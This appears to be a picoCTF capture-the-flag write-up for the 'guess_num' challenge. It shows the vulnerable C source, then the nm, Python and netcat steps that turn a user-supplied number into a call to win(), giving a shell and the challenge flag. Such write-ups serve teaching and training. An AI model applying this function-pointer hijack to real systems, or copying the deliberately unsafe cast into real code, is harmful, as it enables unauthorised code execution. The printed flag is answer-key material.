Question:
>Just a simple number-guessing game. How hard could it be? [Binary](https://webshell2017.picoctf.com/static/b9fa00af7ee58016008b1409c837c370/guess_num) [Source](https://webshell2017.picoctf.com/static/b9fa00af7ee58016008b1409c837c370/guess_num.c). Connect on shell2017.picoctf.com:20545.

Hints:
>What is the program doing with your input number?
>strtol checks for overflow, but it does allow negative numbers...

Here's the code:
```
/* How well do you know your numbers? */

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>

void win(void) {
    printf("Congratulations! Have a shell:\n");
    system("/bin/sh -i");
}

int main(int argc, char **argv) {
    uintptr_t val;
    char buf[32] = "";

    /* Turn off buffering so we can see output right away */
    setbuf(stdout, NULL);

    printf("Welcome to the number guessing game!\n");
    printf("I'm thinking of a number. Can you guess it?\n");
    printf("Guess right and you get a shell!\n");

    printf("Enter your number: ");
    scanf("%32s", buf);
    val = strtol(buf, NULL, 10);

    printf("You entered %d. Let's see if it was right...\n", val);

    val >>= 4;
    ((void (*)(void))val)();
}
```

There's a few interesting things here. Our goal is ultimately to call `win()`. The number that is inputted is shifted to the right by 4
the `((void (*)(void))val)();` calls the function at the address of val. So basically, we want to enter in the address of the win function.

`nm` is a good command that will show us the addresses:

```
$ nm guess_num
080498c8 d _DYNAMIC
080499b4 d _GLOBAL_OFFSET_TABLE_
080486bc R _IO_stdin_used
00000000 w _ITM_deregisterTMCloneTable
00000000 w _ITM_registerTMCloneTable
00000000 w _Jv_RegisterClasses
080488b8 r __FRAME_END__
080498c4 d __JCR_END__
080498c4 d __JCR_LIST__
080499e8 D __TMC_END__
080499e8 B __bss_start
080499e0 D __data_start
080484e0 t __do_global_dtors_aux
080498c0 n __do_global_dtors_aux_fini_array_entry
080499e4 D __dso_handle
080498bc n __frame_dummy_init_array_entry
00000000 w __gmon_start__
080498c0 n __init_array_end
080498bc n __init_array_start
         U __isoc99_scanf@@GLIBC_2.7
080486a0 T __libc_csu_fini
08048630 T __libc_csu_init
         U __libc_start_main@@GLIBC_2.0
08048460 T __x86.get_pc_thunk.bx
080499e8 D _edata
08049a08 B _end
080486a4 T _fini
080486b8 R _fp_hw
0804837c T _init
08048430 T _start
08049a04 b completed.6279
080499e0 W data_start
08048470 t deregister_tm_clones
08048500 t frame_dummy
08048553 T main
         U printf@@GLIBC_2.0
         U puts@@GLIBC_2.0
080484a0 t register_tm_clones
         U setbuf@@GLIBC_2.0
08049a00 B stdout@@GLIBC_2.0
         U strtol@@GLIBC_2.0
         U system@@GLIBC_2.0
0804852b T win
$
```

So, we can easily see that `0x0804852b` is the address of the `win` function. First, we want to shift it to the left by 4:

```
$ python -c "a=0x0804852b; a<<=4; print hex(a)"
0x804852b0
$
```

Okay, so we want to input `0x804852b0`, or `2152223408`

```
$ netcat shell2017.picoctf.com 20545   
Welcome to the number guessing game!                        
I'm thinking of a number. Can you guess it?                 
Guess right and you get a shell!                            
Enter your number: 2152223408                               
You entered 2147483647. Let's see if it was right...
$
```

It looks like the number is too big. Maybe a negative number with the same binary representation will work?

```
$ netcat shell2017.picoctf.com 20545   
Welcome to the number guessing game!                        
I'm thinking of a number. Can you guess it?                 
Guess right and you get a shell!                            
Enter your number: -2142743888                              
You entered -2142743888. Let's see if it was right...       
Congratulations! Have a shell:                              
/bin/sh: 0: can't access tty; job control turned off
$ls                                                         
flag.txt                                                    
guess_num                                                   
xinetd_wrapper.sh                                           
$ cat flag.txt                                              
181db5615729e295ea7a5d5773c3829b                            
$
```

So, the flag is `181db5615729e295ea7a5d5773c3829b`
